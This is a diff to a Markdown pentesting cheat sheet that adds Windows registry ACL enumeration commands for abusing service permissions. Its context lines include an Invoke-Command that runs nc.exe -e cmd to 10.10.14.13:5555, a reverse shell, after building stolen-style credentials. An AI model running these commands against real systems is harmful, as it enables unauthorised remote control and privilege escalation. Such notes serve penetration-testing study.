@@ -376,6 +376,15 @@ ps > $cred = new-object -typename System.Management.Automation.PSCredential -arg
 ps > Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { whoami }
 ps > Invoke-Command -ScriptBlock {\windows\temp\nc.exe -e cmd 10.10.14.13 5555 } -computer localhost
 ```
+##### Abusing Windows ACLs
+Enumerate if some user has full control
+```
+get-acl HKLM:\SYSTEM\CurrentControlSet\Services | format-list
+```
+List all acl services
+```
+get-acl HKLM:\System\CurrentControlSet\services\* | Format-List *
+```
 
 ### Linux
 ##### Directory Permissions
